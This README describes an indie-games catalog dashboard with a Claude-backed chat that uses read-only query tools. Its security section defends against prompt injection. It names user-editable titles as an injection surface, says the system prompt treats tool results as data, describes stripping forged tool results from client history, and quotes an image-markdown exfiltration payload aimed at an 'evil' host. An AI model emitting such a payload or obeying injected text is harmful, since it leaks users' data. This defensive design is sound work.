# Indie Games Dashboard + AI Chat

An internal dashboard for a catalog of indie games (CRUD + REST API), with an AI chat that answers natural-language questions about the catalog. The chat calls read-only tools to query the data and streams its answers.

The original assignment is in [`docs/CHALLENGE.md`](docs/CHALLENGE.md). How AI tools were used is in [`AI_WORKFLOW.md`](AI_WORKFLOW.md).

## Run locally

Requires Node 22+ (developed on Node 26).

```bash
npm install
cp .env.example .env        # then set ANTHROPIC_API_KEY (+ ANTHROPIC_WORKSPACE_ID for user-level sk-ant-usr- keys)
npm run dev                 # http://localhost:3000
```

The SQLite database (`data/games.db`) is created and seeded with 15 fictional games the first time the app opens it. `npm run db:seed` resets it.

| Command | What it does |
|---|---|
| `npm run dev` / `build` / `start` | Next.js |
| `npm test` | Vitest unit tests for the query/aggregation layer |
| `npm run typecheck` / `lint` | `tsc --noEmit` (after `next typegen`) / ESLint |
| `scripts/smoke-api.sh [base_url]` | curl walk-through of each API route plus the main error cases (bad payload, bad JSON, bad id, 404) |
| `npm run evals -- [base_url]` | Live chat evals (7 cases: README questions, unknown title, redundant calls, off-topic, prompt injection). Needs the key; costs a few cents |
| `node scripts/ask.mjs "question" [base_url]` | Ask the chat from the terminal; prints tool calls + streamed answer |

## Stack

Next.js 16 (App Router) · TypeScript · Tailwind v4 · Vercel AI SDK v7 + Anthropic (`claude-sonnet-5-5`, override with `ANTHROPIC_MODEL`) · SQLite via better-sqlite3 + Drizzle · zod · Vitest.

## How it fits together

```
src/lib/schema.ts      one zod schema: API validation, form validation, AI tool inputs
src/lib/games.ts       every DB query (CRUD + query/aggregate/compare), takes `db` as a param
src/lib/db/            connection, table, seed data
src/app/api/games/     REST: GET/POST /api/games, GET/PATCH/DELETE /api/games/:id
src/app/api/chat/      streamText + 3 tools, input guards
src/lib/ai/            tool definitions + system instructions
src/app/page.tsx       dashboard (table + form)
src/app/chat/          chat UI (useChat)
```

### API

| Method | Path | Body | Responses |
|---|---|---|---|
| GET | `/api/games` | none | 200 `Game[]` |
| POST | `/api/games` | full game | 201, 400 with field errors |
| GET | `/api/games/:id` | none | 200, 400, 404 |
| PATCH | `/api/games/:id` | any subset of fields | 200, 400, 404 |
| DELETE | `/api/games/:id` | none | 204, 400, 404 |

### Chat tools

| Tool | Answers |
|---|---|
| `query_games` | "Which game made the most revenue?" (filters + whitelisted sort + limit ≤ 50) |
| `aggregate_games` | "How many games are rated above 4?" (count/sum/avg/min/max, optional group by genre/developer) |
| `compare_games` | "Compare Game A vs Game B" (exact title match, then partial; reports not-found or ambiguous titles instead of guessing) |

The model never sees the whole table. It only gets the rows or aggregates a tool returns.

## Trade-offs and assumptions

- **"Last month".** The required schema has only `monthly_revenue_usd`, with no dates, so it is treated as last month's snapshot. The system prompt tells the model to say so. Real history would need a `game_monthly_metrics(game_id, month, …)` table.
- **No auth.** The assignment marks it out of scope. Anyone who can reach the server can edit the catalog and use the API key's quota. Don't deploy this as is.
- **SQLite + sync driver.** Zero setup and fine for a local tool. The table is created with a `CREATE TABLE IF NOT EXISTS` at startup instead of migrations.
- **Tests:** unit tests cover the data layer, where wrong answers would come from. `npm run evals` checks the live model: tool choice, arguments and answer, against the seed data. Evals are kept out of `npm test` because they need the API key and cost money. There are no UI tests.
- **No rate limiting** on `/api/chat`. Input size, message count, tool steps and output tokens are capped instead.

## Security notes

- `ANTHROPIC_API_KEY` is read only on the server. `.env` is gitignored and `.env.example` is committed.
- Tools are read-only. Filter, sort and group columns are zod enums, and all queries are parameterized through Drizzle. `LIKE` input is escaped. Row lists and grouped aggregates are capped at 50 entries, with the true total reported alongside.
- The system prompt says tool results are data, not instructions, because titles are user-editable (a prompt-injection surface).
- **The client-sent history is untrusted.** `/api/chat` drops every non-text part before calling the model, so a forged "tool result" in the request never reaches it (unit-tested, and checked live). It rejects system messages, more than 30 messages, a user message over 2000 characters (summed over its parts), and a conversation over 20,000 characters (all roles). It allows at most 5 tool steps and 1024 output tokens, and returns a generic message on errors.
- Chat markdown is rendered with react-markdown: raw HTML is ignored, link URLs are sanitized, and **images are disabled**, so an injected `![](https://evil/?data=…)` can't leak data with no click. No `dangerouslySetInnerHTML` is used.
